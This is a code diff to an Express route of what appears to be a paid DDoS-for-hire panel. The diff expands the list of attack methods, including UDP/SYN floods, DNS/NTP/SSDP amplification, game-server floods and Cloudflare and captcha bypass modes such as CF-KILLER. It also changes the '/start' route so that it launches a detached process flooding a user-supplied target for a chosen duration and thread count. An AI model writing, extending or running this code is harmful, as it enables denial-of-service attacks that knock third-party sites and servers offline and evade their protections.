@@ -1,13 +1,56 @@
 import express from 'express';
 import { body, validationResult } from 'express-validator';
+import { spawn } from 'child_process';
 import { Attack, Credit, User } from '../../database/models.js';
 import { AttackManager } from '../../core/attack-manager.js';
 import { ComboAttackManager } from '../../core/combo-attack.js';
 import { globalStats } from '../../utils/statistics-tracker.js';
 
-// Define methods manually to avoid import issues
-const LAYER4_METHODS = ['UDP', 'TCP', 'SYN', 'VSE', 'TS3', 'MINECRAFT', 'MINECRAFT-BOT', 'NTP-AMP', 'DNS-AMP', 'SSDP-AMP'];
-const LAYER7_METHODS = ['GET', 'POST', 'HTTP2', 'HTTP2-POST', 'STRESS', 'NULL', 'DYN', 'SLOW', 'APACHE', 'XMLRPC', 'CFB', 'BYPASS', 'HTTP2-CF', 'HTTP3'];
+// Define all available methods
+const LAYER4_METHODS = [
+    'UDP',
+    'TCP',
+    'MINECRAFT',
+    'MCBOT',
+    'CPS',
+    'CONNECTION',
+    'SYN',
+    'VSE',
+    'TS3',
+    'MCPE',
+    'FIVEM',
+    'FIVEM-TOKEN',
+    'OVH-UDP',
+    'DNS-AMP',
+    'NTP-AMP',
+    'SSDP-AMP'
+];
+
+const LAYER7_METHODS = [
+    'GET',
+    'POST',
+    'HEAD',
+    'SLOW',
+    'HTTP2',
+    'HTTP2-POST',
+    'HTTP2-CF',
+    'HTTP3',
+    'HTTP3-POST',
+    'CFB',
+    'CFBUAM',
+    'BYPASS',
+    'BOT',
+    'PRIVACYPASS',
+    'CAPTCHA',
+    'ULTIMATE',
+    'XMLRPC',
+    'STRESS',
+    'DYN',
+    'COOKIE',
+    'APACHE',
+    'NULL',
+    'CF-KILLER'
+];
 
 const router = express.Router();
 
@@ -121,47 +164,45 @@ router.post('/start',
                 userAgent: req.headers['user-agent']
             });
 
-            // Start statistics tracking
-            globalStats.reset();
-            globalStats.start();
-
-            // Start attack in separate process to avoid blocking web server
-            setImmediate(() => {
-                const attackManager = new AttackManager({
-                    target,
-                    method,
-                    threads: parseInt(threads),
-                    duration: parseInt(duration),
-                    rpc: parseInt(rpc),
-                    proxies: null,
-                    userAgents: null,
-                    referers: null,
-                    enableMonitoring: true
-                });
-                
-                activeAttacks.set(req.user.id, attackManager);
-                
-                // Start attack (non-blocking)
-                attackManager.start().then(async () => {
-                    // Attack completed
-                    const stats = globalStats.getStats();
-                    
-                    await Attack.updateStatus(attackRecord.id, 'completed', {
-                        totalRequests: stats.totalRequests,
-                        successfulRequests: stats.successfulRequests,
-                        blockedRequests: stats.blockedRequests,
-                        bypassedRequests: stats.bypassedRequests
-                    });
-
-                    globalStats.stop();
-                    activeAttacks.delete(user.id);
-                }).catch(async (err) => {
-                    console.error('Attack error:', err);
-                    await Attack.updateStatus(attackRecord.id, 'failed');
-                    globalStats.stop();
-                    activeAttacks.delete(user.id);
-                });
+            // Start attack in separate child process to avoid blocking web server
+            const attackProcess = spawn('node', [
+                'index.js',
+                'attack',
+                '--target', target,
+                '--method', method,
+                '--threads', threads.toString(),
+                '--duration', duration.toString(),
+                '--rpc', rpc.toString()
+            ], {
+                detached: true,
+                stdio: 'ignore'
             });
+
+            // Store process info
+            activeAttacks.set(user.id, {
+                pid: attackProcess.pid,
+                attackId: attackRecord.id,
+                startTime: Date.now()
+            });
+
+            // Unref to allow parent to exit independently
+            attackProcess.unref();
+
+            // Monitor attack completion (non-blocking)
+            setTimeout(async () => {
+                try {
+                    // Update attack status after duration
+                    await Attack.updateStatus(attackRecord.id, 'completed', {
+                        totalRequests: 0, // Will be updated by attack process
+                        successfulRequests: 0,
+                        blockedRequests: 0,
+                        bypassedRequests: 0
+                    });
+                    activeAttacks.delete(user.id);
+                } catch (err) {
+                    console.error('Attack completion error:', err);
+                }
+            }, parseInt(duration) * 1000 + 5000); // Add 5s buffer
 
             res.json({
                 success: true,
